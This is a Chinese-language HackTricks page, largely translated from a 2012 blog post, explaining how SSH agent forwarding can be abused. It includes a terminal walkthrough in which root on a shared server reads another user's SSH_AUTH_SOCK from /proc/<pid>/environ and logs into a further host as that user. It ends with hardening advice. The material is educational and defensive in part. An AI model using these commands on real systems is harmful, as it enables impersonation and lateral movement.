<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式:

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 概要

如果您在`/etc/ssh_config`或`$HOME/.ssh/config`配置文件中发现以下内容，您可以做什么：
```
ForwardAgent yes
```
如果您是机器内的root用户，您可能可以**访问在_/tmp_目录中找到的任何代理所做的任何ssh连接**

使用Bob的一个ssh-agent冒充Bob：
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## 为什么这样做有效？

当你设置变量 `SSH_AUTH_SOCK` 时，你正在访问 Bob 在他的 ssh 连接中使用的密钥。然后，如果他的私钥还在（通常会在的），你将能够使用它访问任何主机。

由于私钥是以未加密的形式保存在代理的内存中，我认为，如果你是 Bob 但你不知道私钥的密码，你仍然可以访问代理并使用它。

另一个选项是，代理的用户所有者和 root 可能能够访问代理的内存并提取私钥。

# 详细解释和利用

**引自：** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **当 ForwardAgent 不可信时**

SSH 免密码登录使得 Unix 类操作系统的生活变得更加轻松。如果你的网络需要链式 ssh 会话（例如，访问受限网络），代理转发变得极其有用。通过代理转发，我可以从我的笔记本电脑连接到我的开发服务器，然后从那里运行 svn 检出操作，从另一个服务器上获取数据，整个过程无需密码，同时我的私钥安全地保存在我的本地工作站上。

然而，这可能是危险的。快速的网络搜索将揭示几篇文章，表明这只有在中间主机可信的情况下才是安全的。然而，你很少会找到解释 _为什么_ 这是危险的。

这就是本文的目的。但首先，一些背景知识。

## **如何无密码认证工作**

在正常模式下认证时，SSH 使用你的密码来证明你就是你所说的那个人。服务器将这个密码的哈希值与其文件中的哈希值进行比较，验证哈希值是否匹配，然后让你进入。

如果攻击者能够破解用于保护你的密码在传输到服务器过程中的加密，他们可以窃取它，并且随时以你的身份登录。如果攻击者被允许进行数十万次尝试，他们最终可以猜出你的密码。

一种更安全的认证方法是[公钥认证](http://www.ibm.com/developerworks/library/l-keyc/index.html)，这是一种无需密码登录的方式。公钥认证需要一对匹配的公钥和私钥。公钥加密的消息只能由私钥解密。远程计算机使用它的公钥副本来加密一个秘密消息发送给你。你通过使用你的私钥解密消息并将消息发送回远程计算机来证明你就是你。你的私钥始终安全地保存在你的本地计算机上，免受攻击。

私钥非常宝贵，必须受到保护，因此默认情况下它是以加密格式存储的。不幸的是，这意味着在使用它之前需要输入你的加密密码短语。许多文章建议使用无密码短语（未加密）的私钥来避免这种不便。这是一个坏主意，因为任何能够访问你工作站的人（通过物理访问、盗窃或黑客攻击）现在也可以自由访问任何配置了你公钥的计算机。

OpenSSH 包括 [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)，一个在你的本地工作站上运行的守护进程。它将解密的私钥副本加载到内存中，所以你只需要输入一次你的密码短语。然后它提供一个本地[套接字](http://en.wikipedia.org/wiki/Unix\_domain\_socket)，ssh 客户端可以使用它来请求它解密远程服务器发送回来的加密消息。你的私钥安全地藏在 ssh-agent 进程的内存中，同时仍然允许你在不输入密码的情况下进行 ssh 操作。

## **ForwardAgent 是如何工作的**

许多任务需要“链式”ssh 会话。考虑我之前的例子：我从我的工作站 ssh 到开发服务器。在那里，我需要执行 svn 更新，使用“svn+ssh”协议。由于在共享服务器上留下未加密的私钥副本是愚蠢的，我现在只能使用密码认证。然而，如果我在我的工作站上的 ssh 配置中启用了“ForwardAgent”，ssh 将使用其内置的隧道功能在开发服务器上创建另一个套接字，该套接字通过隧道连接回我本地工作站上的 ssh-agent 套接字。这意味着开发服务器上的 ssh 客户端现在可以直接将“解密这个秘密消息”的请求发送回我工作站上运行的 ssh-agent，从而在不需要访问我的私钥的情况下对 svn 服务器进行认证。

## **为什么这可能是危险的**

简单来说，任何在中间服务器上拥有 root 权限的人都可以自由使用你的 ssh-agent 对其他服务器进行认证。一个简单的演示展示了这样做有多么容易。为了保护无辜者，主机名和用户名已被更改。

我的笔记本电脑正在运行 ssh-agent，它通过一个套接字与 ssh 客户端程序通信。这个套接字的路径存储在 SSH\_AUTH\_SOCK 环境变量中：
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
[ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) 程序允许我们查看和与代理中的密钥进行交互：
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
我在笔记本电脑的 \~/.ssh/config 中设置了 “ForwardAgent yes”。因此，ssh 将创建一个隧道，将本地套接字连接到远程服务器上的本地套接字：
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
即使我的密钥没有安装在“seattle”上，ssh客户端程序仍然能够访问在我本地机器上运行的代理：
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
所以...我们能搞谁？
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
我从来不喜欢Bob。为了找到他的代理连接，我需要找到他的一个ssh会话的子进程：
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)───bash(16817)

sshd(25296)───bash(25297)───vim(14308)
```
在Linux中，有几种方法可以让root查看正在运行的进程的环境。数据可在 `/proc/<pid>/environ` 中找到。由于数据以NULL结尾的字符串存储，我将使用 `tr` 命令将NULL转换为换行符：
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
我现在已经掌握了劫持Bob的ssh-agent所需的所有信息：
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
如果我有一个特定的目标，我现在应该能够直接连接。否则，只需观察进程列表或通过Bob的历史文件进行grep搜索，应该会发现很多机会目标。在这种情况下，我知道Bob在名为“boston”的服务器上存储了各种超级机密文件：
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **保护自己！**

不要让你的ssh-agent无限期地存储你的密钥。在OS X上，配置你的Keychain在不活动或屏幕锁定后锁定。在其他Unix-y平台上，传递-t选项给ssh-agent，这样它的密钥将在秒后被移除。

在连接到不可信的主机时，不要启用代理转发。幸运的是，\~/.ssh/config语法使这变得相当简单：
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **推荐阅读**

* [OpenSSH 密钥管理](http://www.ibm.com/developerworks/library/l-keyc/index.html) – Daniel Robbins
* [SSH 代理转发图解指南](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) – Steve Friedl
* [ssh-agent 手册](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [ssh-add 手册](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
